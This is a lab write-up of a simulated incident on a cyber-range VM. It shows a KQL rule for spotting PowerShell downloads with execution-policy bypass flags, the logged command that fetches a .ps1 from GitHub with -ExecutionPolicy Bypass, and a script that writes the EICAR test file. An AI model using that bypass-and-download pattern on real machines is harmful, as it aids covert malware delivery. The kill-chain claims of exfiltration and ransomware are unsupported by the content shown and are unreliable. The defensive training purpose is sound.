# Incident Response Scenario: Suspicious Powershell Web Requests

<img width="1915" height="764" alt="image" src="https://github.com/user-attachments/assets/d7eef435-4fcf-4b11-bef7-28a175583163" />


## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Microsoft Sentinel
- Kusto Query Language (KQL)
- PowerShell

##  Scenario

After gaining access to a system, attackers often use PowerShell to download and execute malicious scripts while blending in with normal activity. Commands like Invoke-WebRequest or Invoke-RestMethod are common, often paired with -ExecutionPolicy Bypass, -ExecutionPolicy Unrestricted, -ep Bypass, or -EncodedCommand to evade defenses. This post-exploitation tactic enables malware deployment, data exfiltration, or C2 communication, making detection critical.

### High-Level Suspicious Powershell Activity Discovery Plan

- **Check `DeviceProcessEvents`** for any signs of web requests with defense bypasses

---

## Incident Reponse Steps

### 1. Created the alert with the `DeviceProccessEvents` Table

Design a Sentinel Scheduled Query Rule within Log Analytics that will discover when PowerShell is detected using `Invoke-WebRequest` (and appropriate aliases) to download content. Include `-ExecutionPolicy Bypass` (and appropriate alieases) to evade defenses.

**Query used to create alert**

```kql
let targetMachine = "st-vm";
DeviceProcessEvents
| where DeviceName == targetMachine and AccountDomain != "nt authority" // avoids system accounts, only  detecting user activity
| where InitiatingProcessFileName == "powershell.exe" or InitiatingProcessCommandLine has "pwsh"
| where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr", "Invoke-RestMethod", "irm") // catches invoke web requests and the aliases
     and ProcessCommandLine has_any ("-ExecutionPolicy Bypass", "ep Bypass", "-ExecutionPolicy Unrestricted", "-EncodedCommand") // catches execution bypasses and the aliases
| order by TimeGenerated desc
```

---

### 2. Create the Schedule Query Rule in: Sentinel → Analytics → Schedule Query Rule

**Steps:**

<table>
  <tr>
    <td><img width="1200" height="1050" alt="image" src="https://github.com/user-attachments/assets/13fd1aea-8cfc-4b50-acc5-b5b02ad136d8" /></td>
    <td><img width="1400" height="1250" alt="image" src="https://github.com/user-attachments/assets/999c308f-4b3b-4a63-b535-266c96bcfe9f" /></td>
    <td><img width="1200" height="1050" alt="image" src="https://github.com/user-attachments/assets/79778791-163d-4b83-9976-60d183cde346" /></td>
  </tr>
</table>

<table>
  <tr>
    <td><img width="700" height="500" alt="image" src="https://github.com/user-attachments/assets/4a15670a-cc54-4ab6-9644-f28a88332be9" /></td>
    <td><img width="918" height="640" alt="image" src="https://github.com/user-attachments/assets/0673e59a-ee1d-48d9-a3e4-52f8c14144eb" /></td>
  </tr>
</table>

---

### 3. Detection and Analysis

Upon reviewing the triggered incident, the following PowerShell commands were run on this machine: `st-vm`.

```powershell
"powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
```
The following script contained:
`eicar.psi`
```powershell
  # Define the log file path
$logFile = "C:\ProgramData\entropygorilla.log"
$scriptName = "eicar.ps1"

# Function to log messages
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFile -Value $logEntry
}

# EICAR Test String
$eicarTestString1 = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$'
$eicarTestString2 = '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# Define the file path where EICAR file will be created
$eicarFilePath = "C:\ProgramData\EICAR.txt"

# Start logging
Log-Message "Starting creation of EICAR test file."

try {
    # Check if the file already exists, and if it does, delete it first
    if (Test-Path -Path $eicarFilePath) {
        Remove-Item -Path $eicarFilePath -Force
        Log-Message "Existing EICAR file found and deleted."
    }

    # Create the EICAR test file
    "$($eicarTestString1)EICAR$($eicarTestString2)" | Out-File -FilePath $eicarFilePath -Force
    Log-Message "EICAR test file created at $eicarFilePath."

} catch {
    $errorMessage = "An error occurred while creating the EICAR file: $_"
    Write-Host $errorMessage
    Log-Message $errorMessage "ERROR"
}

# End logging
Log-Message "EICAR test file creation completed."
```
We contacted the user to ask what they were doing on their PC around the time of the logs being generated and they said they tried to install a free piece of software. A black screen appeared for a few seconds, then nothing happened.

<img width="1915" height="764" alt="image" src="https://github.com/user-attachments/assets/be17ff4f-8388-44b0-a158-e793460b4d01" />

After investigating with Defender for Endpoint, it's been determined the scripts were executed. 

**Query used**

```kql
DeviceProcessEvents
| where DeviceName == "st-vm"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "eicar"
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated desc
```
<img width="1559" height="127" alt="image" src="https://github.com/user-attachments/assets/ec9375da-e68a-4727-be3e-c48e4214a6f9" />

---

### 4. Script Behavior Analysis

The script `eicar.ps1` generates the standard EICAR antivirus test file and logs each step of the process for auditing and troubleshooting.

---

## Containment, Eradication, and Recovery

### 1. Machine Isolation

Machine was isolated in MDE and an anti-malware scan was run. 

<table>
  <tr>
    <td><img width="679" height="329" alt="image" src="https://github.com/user-attachments/assets/8f435cdb-510b-4cbf-8c88-0e0447dc56cf" /></td>
    <td><img width="542" height="379" alt="image" src="https://github.com/user-attachments/assets/215e0096-1b2e-4821-9d3c-f9d389bf3a48" /></td>
  </tr>
</table>

### 2. Post Incident Activity:

- After removing the threat, and running the anti-malware scan, we removed it from isolation.
- Had the affected user go through cybersecurity awareness training.
- Started the implementation of a policy that restricts the use of PowerShell for non-priviledged users. 

## Frameworks Utilized

### MITRE ATT&CK

• T1071 - Application Layer Protocol

• T1140 - Deobfuscate/Decode Files or Information

• T1562 - Impair Defenses

• T1059 - Command and Scripting Interpreter

• T0871 - Execution through API


### NIST 800-61

• Detection & Analysis – Sentinel analytics rule triggered log-based detection

• Containment – Endpoint isolated through Microsoft Defender for Endpoint

• Eradication & Recovery – System scanned, verified clean, and restored to network

• Post-Incident Activity – Implemented policy adjustments and conducted user awareness training


### Cyber Kill Chain

• Delivery – Malicious scripts retrieved from GitHub using PowerShell

• Exploitation – Execution of .ps1 payloads on the host

• Installation – Persistence established via script placement in C:\ProgramData

• Command & Control – Simulated data exfiltration traffic

• Actions on Objectives – Port scanning and ransomware activity emulated




